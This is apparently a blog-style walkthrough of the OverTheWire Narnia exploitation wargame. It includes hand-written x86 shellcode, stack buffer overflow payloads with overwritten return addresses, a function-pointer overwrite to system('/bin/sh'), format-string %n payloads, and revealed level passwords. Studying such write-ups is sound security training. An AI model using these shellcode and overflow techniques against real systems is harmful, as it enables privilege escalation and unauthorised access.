## Narnia Solutions

Here are short solutions I have written for Narnia levels. This is a wargame in overthewire.org. The main subject of the game is exploitation. I wrote only where I felt that there were not many sufficient solutions to the level.

### Narnia0

Well, I think that there are plany well written solutions for this level. I would like to mention, however, that the shellcode should be generated inside the shell (use python or ruby or perl, etc') because for some unusual reason, pasting a prepeared shellcode inside the shell **will not work**.


### Narnia1

To solve this level, we need to know assembly, x86 in this case (typing "lscpu" will reveal us the architecture and byte order, which are **important** for out shellcode). There are planty writeup's for this level, which most of them are incorrect (but I do recommand reading them in order to understand what is wrong), however. Moreover, I would advise you to learn how to write a shellcode in linux, because copying and pasting a shellcode from shell storm won't work in this case. So after we figure out that there is a buffer overflow with the enviromental variable, we want to inject our shellcode. Remeber, no null bytes and illegal chars!
Because spawning a regular shell won't work (the shell will be privileged with narnia1 user), we want to use the our vulnerability to open narnia2 password file. Let's dive into our shell code:
```
section .text
	global _start

_start:
	xor eax,eax
	push eax          ;end of the /bin/cat string
	push 0x7461632f
	push 0x6e69622f
	mov ebx, esp      ;ebx points to the start of the string
	push eax
	push 0x3261696e
	push 0x72616e2f
	push 0x73736170
	push 0x5f61696e
	push 0x72616e2f
	push 0x6374652f
	mov ecx, esp      ;ecx points to the start of the string (/etc/narnia_pass/narnia2)
  push eax          ;array has to end with null
	mov al, 11        ;we use execve syscall, numbered 11
	mov edx, esp      ;edx points to null (we don't need char *const envp[])
	push ecx          ;push the first arg (/etc/narnia_pass/narnia2)
	push ebx          ;push the second arg (/bin/cat
	mov ecx, esp      ;ecx points to array with two args
	int 0x80
```	
	
Now, we want to compile our code and link it, thus:
```nasm -f elf shell.asm -o shell.o
ld -m elf_i386 -s shell.o -o shell
```
(-m elf_i386 is not necessary, but was in my case)

Okay, let's extract our shellcode:
`for i in $(objdump -M intel -d shell | grep "^ "|cut -f2); do echo -n '\x'$i;done;echo`
and Wallah:
```
narnia1@narnia:~$ export EGG=`python -c "print('\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80')"`
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
nairiepecu
```

### Narnia2

Here, we are dealing with a classic buffer overflow once again. We can see that our buffer is limited, hence we can give a bigger input that exceeds our buffer size  (no input validation is done) and thus overwrite our return address from the main() function. This will allow us to jump into a place we control and execute our shellcode. I truly recommand reading phracks 'smashing the stack' article to gain better understanding of this attack: http://phrack.org/issues/49/14.html

Let's proceed to our soltuion:
First, we fire up gdb and give it an input which is bigger than expected and see what happens with our stack:
```
disas main
(we break on the address of ret, because we want to overwrite the return address)
b *0x080484b2(ret's_address, which is obviously different for everyone)
r $(python -c "print('a'*130)")
```
now let's check if our $ebp was or $esp were overwritten:
``` info reg ```
No, not yet. After trying for several times, input of 144*'a' will overwrite esp and eip (eip contains the return address).
Now, we want to overwrite the last 4 bytes with 'our' address (our controlled address). We will add our shellcode from the previous level and will change it slighlty (will read narnia3 file instead of narnia2). It's size is 59 bytes. Now, we want our controlled address be the address in the stack in which the injected shellcode starts. Therefore we will inject our shellcode and see where it starts, letting us to overwrite the eip address to point to the start of it:
```
r $(python -c "print('a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'aaaa')")
```
```
x/200wx $esp
0xffffd780:	0x616e2f61	0x61696e72	0x61610032	0x61616161
0xffffd790:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7b0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7d0:	0x61616161	0x61616161	0x31616161	0x2f6850c0
0xffffd7e0:	0x68746163	0x6e69622f	0x6850e389	0x3361696e
0xffffd7f0:	0x616e2f68	0x61706872	0x6e687373	0x685f6169
0xffffd800:	0x72616e2f	0x74652f68	0x50e18963	0xe2890bb0
0xffffd810:	0xe1895351	0x616180cd	0x58006161	0x535f4744
```
We can see that our shellcode starts at: 0xffffd7d0+B(11 in decimal)=0xffffd7db. Additionaly, we can see that eip is overwritten by our 4 extra bytes:
```
(gdb) info frame
Stack level 0, frame at 0xffffd5b4:
 eip = 0x61616161; saved eip = 0x0
 called by frame at 0xffffd5b8
 Arglist at 0xffffd5ac, args: 
 Locals at 0xffffd5ac, Previous frame's sp is 0xffffd5b4
 Saved registers:
  eip at 0xffffd5b0
```
Okay, now we know our injection code should be the following:
```
'a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'\xdb\xd7\xff\xff'
```
Let's get the password:
./narnia2 ``python -c "print('a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'\xdb\xd7\xff\xff')"``
and...........wallah:
vaequeezee

## Narnia 3-4
I don't think there is something special in these excercises. There are great write ups for them: http://tutorialsjunkie.blogspot.com/2018/02/overthewire-narnia-walkthrough.html
Side note: narnia4 uses a nope slide, which is an important technique to master.


## Narnia 5

Here we are exploiting format string vulnerability. One should get familier with the %x, %n and %s format string. Usually, the most common vulnerable function for format string are: 
printf
vsprintf
fprintf
vsnprf
sprint
vfprintf
snprintf
vprintf

What happens basically is as following: '%x,%s,%n' are special format string input. When we put them into a function such as above, the function expects an argument corresponding to them. If we put more format string input than actuall corresponding arguments, the function will start pulling addresses from the stack with the "%x" format string. This is great for us, as we can determine how much addresses we need to pop (each address is 4 bytes big) and then write their length into a address crafted by us. Meet the "%n" format string, which takes an address and write number of byes into it. This is exactly what we are going to do - determine what is the address and then craft 500 bytes into I's address.
First, we want to pop out our input from the stack. We will do it by trying to print our input. For me, it takes 5 format strings:
```
narnia5@narnia:/narnia$ ./narnia5 `python -c "print('aaaa')"`%x%x%x%x%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [aaaac287ffffffff2ff7e23dc861616161] (34)
i = 1 (0xffffd62c)
```
As seen above, 61616161 ('aaaa') is popped in the end, it means that we need 5 format strings in order to pop our input. Let's change it to I's address:
```
`python -c "print('\x2c\xd6\xff\xff')"`%x%x%x%x%x
```
and now we want to write 500 bytes, so we need to replace the last %x with %n and add additional width:
```
`python -c "print('\x2c\xd6\xff\xff')"`%x%x%x%482u%n
```
Why 482? because %x takes 4 bytes and %n 2 bytes, tehrefore 482+(4 * 4)+2=500.
```
narnia5@narnia:/narnia$ ./narnia5 `python -c "print('\x2c\xd6\xff\xff')"`%x%x%x%482u%n
Change i's value from 1 -> 500. GOOD
$ ^C
```
here we go.

##Narnia6

This one is really fascinating. At first, I thought: how do I get around the assembly code. Later on, I just read a write up and learned about the technique used in this level. In short, we use the power of the libraries that are compiled with the program. Here particularly, we will utilize stdlib.h with it's system function, to execute our shell. It's not hard to notice we have a buffer overflow vulnerability in our code, due to lack of buffer size check in strcpy function. After launching gdb, I started inserting different inputs and observing our stack. First input:
``` 
(gdb) r $(python -c "print('A'*8+' '+'B'*8)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 $(python -c "print('A'*8+' '+'B'*8)")

Breakpoint 6, 0x080486d7 in main ()
(gdb) x/50wx $esp
0xffffd5f0:	0xffffd608	0xffffd810	0x00000021	0x0804877b
0xffffd600:	0x00000003	0xffffd6c4	0x42424242	0x42424242
0xffffd610:	0x41414100	0x41414141	0x08048400	0x00000003
0xffffd620:	0xf7fc7000	0x00000000	0x00000000	0xf7e2f637
0xffffd630:	0x00000003	0xffffd6c4	0xffffd6d4	0x00000000
0xffffd640:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
0xffffd650:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
0xffffd660:	0x00000000	0xae32dc04	0x94755214	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000003	0x080484a0
0xffffd680:	0x00000000	0xf7feeff0	0xf7fe9880	0xf7ffd000
0xffffd690:	0x00000003	0x080484a0	0x00000000	0x080484c1
0xffffd6a0:	0x080485a9	0x00000003	0xffffd6c4	0x08048730
0xffffd6b0:	0x08048790	0xf7fe9880
```
we can see that b2 is aligned first, then b1, then our function pointer(0x08048400), the the amount of arguments to be checked (3) and so on. Now, let's overflow our buffer with a bit more chars:
```
(gdb) r $(python -c "print('A'*12+' '+'B'*12)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 $(python -c "print('A'*12+' '+'B'*12)")

Breakpoint 6, 0x080486d7 in main ()
(gdb) x/50wx $esp
0xffffd5e0:	0xffffd5f8	0xffffd80c	0x00000021	0x0804877b
0xffffd5f0:	0x00000003	0xffffd6b4	0x42424242	0x42424242
0xffffd600:	0x42424242	0x41414100	0x41414141	0x00000000
0xffffd610:	0xf7fc7000	0x00000000	0x00000000	0xf7e2f637
0xffffd620:	0x00000003	0xffffd6b4	0xffffd6c4	0x00000000
0xffffd630:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
0xffffd640:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
0xffffd650:	0x00000000	0x90b53d1b	0xaaf2930b	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000003	0x080484a0
0xffffd670:	0x00000000	0xf7feeff0	0xf7fe9880	0xf7ffd000
0xffffd680:	0x00000003	0x080484a0	0x00000000	0x080484c1
0xffffd690:	0x080485a9	0x00000003	0xffffd6b4	0x08048730
0xffffd6a0:	0x08048790	0xf7fe9880
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
here we can see that b1 overwritten fp's address, hence when continuing, the function pointers doesn't know what kind of address is 'AAAA'. Okay, now when we know we can manipulate our function pointer, we can use a powerful function in stdlib called system instead of puts as used originally in our code. This way, we can execute "system(b1)". Now all we have to do is to find the address of that function (function pointers point to addresses) and insert into b1 our shell path. First we find the system function address after it loads into our program:
```
Breakpoint 6, 0x080486d7 in main ()
(gdb) p system
$6 = {<text variable, no debug info>} 0xf7e51940 <system>
(gdb) 
```
Great, now we craft a "/bin/sh;" into b1 (';' is used to ignure anything after our string). Luckly, we don't need to add more chars to b1 because our address aligns perfectly into the fp address:
```
(gdb) r $(python -c "print('\x2f\x62\x69\x6e\x2f\x73\x68\x3b'+'\x40\x19\xe5\xf7'+' '+'\x90')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 $(python -c "print('\x2f\x62\x69\x6e\x2f\x73\x68\x3b'+'\x40\x19\xe5\xf7'+' '+'\x90')")

Breakpoint 6, 0x080486d7 in main ()
(gdb) x/50wx $esp
0xffffd5f0:	0xffffd608	0xffffd817	0x00000021	0x0804877b
0xffffd600:	0x00000003	0xffffd6c4	0xffff003b	0x08048751
0xffffd610:	0x6e69622f	0x3b68732f	0xf7e51940	0x00000000
0xffffd620:	0xf7fc7000	0x00000000	0x00000000	0xf7e2f637
0xffffd630:	0x00000003	0xffffd6c4	0xffffd6d4	0x00000000
0xffffd640:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
0xffffd650:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
0xffffd660:	0x00000000	0x76169739	0x4c511929	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000003	0x080484a0
0xffffd680:	0x00000000	0xf7feeff0	0xf7fe9880	0xf7ffd000
0xffffd690:	0x00000003	0x080484a0	0x00000000	0x080484c1
0xffffd6a0:	0x080485a9	0x00000003	0xffffd6c4	0x08048730
0xffffd6b0:	0x08048790	0xf7fe9880
```
as you can see, we overwritten fp with system's addres (0xf7e51940) and b1 contains our string. I added a ' ' & nop char so our program won't close. running ``./narnia6 $(python -c "print('\x2f\x62\x69\x6e\x2f\x73\x68\x3b'+'\x40\x19\xe5\xf7'+' '+'\x90')")`` will give us the pass.

## Narnia7
Initially, I read the code and figured out quite easily that we have a string format vulnerability, because we had a similar case in the previous levels. Again, we want to overwrite the function pointer with the "hacked" function address. I read a wonderful tutorial in here: https://jbremer.org/format-string-vulnerabilities/#comment-141623
It has everything in order to complete this challange. In addition, it provides a methond to obtain the offset for our format string.
To sum up, my query was:
```./narnia7 $(python -c 'print("\x6c\xd5\xff\xff\x6e\xd5\xff\xff%34638c%6$n%32942c%7$n")') ```

